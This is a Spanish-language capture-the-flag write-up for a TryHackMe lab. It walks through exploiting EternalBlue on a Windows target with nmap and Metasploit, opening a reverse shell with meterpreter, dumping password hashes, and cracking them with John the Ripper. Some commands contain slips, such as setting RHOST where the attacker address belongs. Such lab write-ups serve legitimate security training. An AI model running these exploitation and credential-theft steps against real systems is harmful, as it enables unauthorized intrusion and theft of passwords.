
Como ya tenemos la IP no hace falta realizar un reconocimiento de HOST.

- IP victima `10.10.59.5`

## Comprobar si tengo conexión
```
ping -c 1 10.10.59.5
```
<p align="center">
    <img src="../img/Pasted_image_20240817222409.png" width="500">
</p>

# Reconocimiento

## NMAP
```
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.59.5 -oN basic_scan
```
<p align="center">
    <img src="../img/Pasted_image_20240817222632.png" width="500">
</p>

# ENUMERACIÓN

## NMAP
```
nmap -p135,139,445,3389,49152,49143,49154,49158,49160 -sVC --min-rate 5000 -n -Pn -vvv 10.10.59.5 -oN ports_scan
```
<p align="center">
    <img src="../img/Pasted_image_20240817223213.png" width="500">
</p>
<p align="center">
    <img src="../img/Pasted_image_20240817223253.png" width="500">
</p>
<p align="center">
    <img src="../img/Pasted_image_20240817223313.png" width="500">
</p>
Pruebo si el puerto 445, es vulnerable al **ETERNAL BLUE**

### PUERTO 445 - SMB
- Pruebo si es vulnerable a la vulnerabilidad de **eternal blue**. Los pasos que hay que seguir son:
```
nmap --script "vuln and safe" -n -Pn -p445 10.10.59.5 -oN vulnScan
```
<p align="center">
    <img src="../img/Pasted_image_20240817231249.png" width="500">
</p>
Es vulnerable.

#### 1- INICIAR METASPLOIT
```
msfconsole -q
```
<p align="center">
    <img src="../img/Pasted_image_20240817223825.png" width="500">
</p>

####  2-BUSCAR EXPLOIT
```
search eternalblue
```
<p align="center">
    <img src="../img/Pasted_image_20240817223922.png" width="500">
</p>

#### 3- COMPRUEBO SI ES VULNERABLE
```
use 24
```
<p align="center">
    <img src="../img/Pasted_image_20240817232512.png" width="500">
</p>
- Veo las opciones que tiene
```
show options
```
<p align="center">
    <img src="../img/Pasted_image_20240817232812.png" width="500">
</p>

- Configuro RHOST que es la IP de la máquina victima. Y vuelvo a revisar las opciones
```
set RHOST 10.10.59.5
```
```
show options
```
<p align="center">
    <img src="../img/Pasted_image_20240817232928.png" width="500">
</p>

- Ejecuto para ver si es vulnerable a **ETERNALBLUE**
```
run
```
<p align="center">
    <img src="../img/Pasted_image_20240817233053.png" width="500">
</p>
Es vulnerable

# EXPLOTACIÓN

#### 4- USO EL EXPLOIT
- Voy a usar el exploit con el ID 24
```
use 0
```
<p align="center">
    <img src="../img/Pasted_image_20240818113056.png" width="500">
</p>
#### 5- VER/CAMBAIR OPCIONES
- Veo las opciones que tiene
```
show options
```
<p align="center">
    <img src="../img/Pasted_image_20240818113125.png" width="500">
</p>

- Solo tengo que introducir la IP de la máquina victima y cambiar mi IP, porque al estar en TRYHACME me da otro rango la IP `10.2.37.7`. NO HAY QUE PONERSE A LA ESCUCHA. Me da directamente un `meterpreter`. 
```
set RHOST 10.10.231.27
```
```
set RHOST 10.2.37.7
```
```
show options
```
<p align="center">
    <img src="../img/Pasted_image_20240818113802.png" width="500">
</p>

#### 6- Ejecutar el exploit
```
run
```
<p align="center">
    <img src="../img/Pasted_image_20240817233657.png" width="500">
</p>
Ahora hemos recibido un shell, pero no podemos hacer mucho con él. Por lo tanto, ahora ponemos en segundo plano la sesión (1.ª) y actualizamos a un shell de meterpreter

Para cambiar la carga útil, podemos cambiar el PAYLOAD ,utilice el comando:
```
set payload windows/x64/shell/reverse_tcp
```


# POST-EXPLOTACIÓN

Para poner el `meterpreter` en segundo plano usamos
```
CTRL + Z
```
<p align="center">
    <img src="../img/Pasted_image_20240818114943.png" width="500">
</p>

Si quiero ver la sesión del `meterpreter`
```
sessions -l
```
<p align="center">
    <img src="../img/Pasted_image_20240818115015.png" width="500">
</p>

Para volver al `meterpreter`
```
sessions 1
```
<p align="center">
    <img src="../img/Pasted_image_20240818115233.png" width="500">
</p>

#### CRACKING
Estando con el `meterpreter` ya puedo ejecutar comandos.

##### HASHES
Podemos volcar las contraseña con el comando
```
hashdump
```
<p align="center">
    <img src="../img/Pasted_image_20240818121100.png" width="500">
</p>

Copiamos el hash equivalente a Jon y lo guardamos en un archivo en el escritorio.
```
hashJon
```
<p align="center">
    <img src="../img/Pasted_image_20240818121247.png" width="500">
</p>
<p align="center">
    <img src="../img/Pasted_image_20240818121257.png" width="500">
</p>

A continuación, utilizamos la herramienta “ **John the Ripper** ” para descifrar el hash.

##### JOHN THE RIPPER
```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt hashJon 
```
<p align="center">
    <img src="../img/Pasted_image_20240818121558.png" width="500">
</p>

##### ENCONTRAR BANDERAS
Me paso del meterpreter a una shell de windows
```
shell
```
<p align="center">
    <img src="../img/Pasted_image_20240818121724.png" width="500">
</p>

###### flag1
<p align="center">
    <img src="../img/Pasted_image_20240818121940.png" width="500">
</p>

###### flag2
<p align="center">
    <img src="../img/Pasted_image_20240818122056.png" width="500">
</p>

###### flag3
<p align="center">
    <img src="../img/Pasted_image_20240818122229.png" width="500">
</p>



